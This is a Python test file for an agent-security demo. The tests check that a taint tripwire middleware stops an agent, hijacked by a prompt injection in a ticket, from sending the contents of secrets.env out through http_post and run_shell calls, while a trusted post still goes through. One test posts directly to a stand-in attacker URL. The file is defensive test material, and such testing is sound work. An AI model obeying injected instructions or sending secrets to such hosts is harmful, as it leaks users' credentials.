"""Smoke + behaviour tests for 01-injection-tripwire.

These lock in the demo's whole point: the taint tripwire blocks
injection-driven exfiltration at the tool boundary while still letting
legitimate, trusted-destination work through. Dependency-free; also runs under
pytest.
"""

from __future__ import annotations

import importlib.util
import os
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
DEMO = os.path.join(HERE, "..", "demo.py")

spec = importlib.util.spec_from_file_location("injection_demo_under_test", DEMO)
demo = importlib.util.module_from_spec(spec)
spec.loader.exec_module(demo)  # type: ignore[union-attr]

from shim import Blocked, Interceptor, make_toolbox  # noqa: E402


def _play(ix):
    executed, blocked = [], []
    for tool, args, _ in demo.AGENT_PLAN:
        try:
            ix.call(tool, **args)
            executed.append((tool, args))
        except Blocked as b:
            blocked.append((tool, b.decision))
    return executed, blocked


def test_ungoverned_leaks_the_secret():
    ws = tempfile.mkdtemp()
    demo._seed(ws)
    from shim.middleware import FlightRecorder

    rec = FlightRecorder()
    ix = Interceptor(make_toolbox(ws), middleware=[rec])
    executed, blocked = _play(ix)

    assert blocked == []            # nothing is governed
    assert demo._leaked(rec) is True  # the secret escapes


def test_governed_blocks_exfil_but_allows_trusted_post():
    ws = tempfile.mkdtemp()
    demo._seed(ws)
    ix = demo.build_governed(make_toolbox(ws))
    executed, blocked = _play(ix)

    blocked_tools = [t for t, _ in blocked]
    executed_tools = [t for t, _ in executed]

    # Both untrusted sinks are stopped...
    assert blocked_tools.count("http_post") == 1
    assert blocked_tools.count("run_shell") == 1
    # ...every block is attributed to the tripwire...
    assert all(d.source == "taint-tripwire" for _, d in blocked)
    # ...but the legitimate post to the trusted endpoint still runs.
    assert executed_tools.count("http_post") == 1

    rec = next(mw for mw in ix.middleware if type(mw).__name__ == "FlightRecorder")
    assert demo._leaked(rec) is False


def test_injection_is_flagged_in_untrusted_input():
    ws = tempfile.mkdtemp()
    demo._seed(ws)
    ix = demo.build_governed(make_toolbox(ws))
    _play(ix)

    tripwire = next(mw for mw in ix.middleware if isinstance(mw, demo.TaintTripwire))
    assert tripwire.injections            # the ticket's injection was detected
    assert tripwire.secret_in_play        # reading secrets.env was noticed


def test_untrusted_read_is_required_to_trip():
    """No untrusted ingestion => no taint => outbound calls are not blocked."""
    tripwire = demo.TaintTripwire(trusted_dests=demo.TRUSTED_DESTS)
    ws = tempfile.mkdtemp()
    demo._seed(ws)
    ix = Interceptor(make_toolbox(ws), middleware=[tripwire])

    # Post to the attacker WITHOUT first ingesting untrusted input: allowed,
    # because taint tracking only fires on data that actually entered untrusted.
    ix.call("http_post", url="https://attacker.evil/collect", body="hello")
    assert tripwire.taint_sources == []
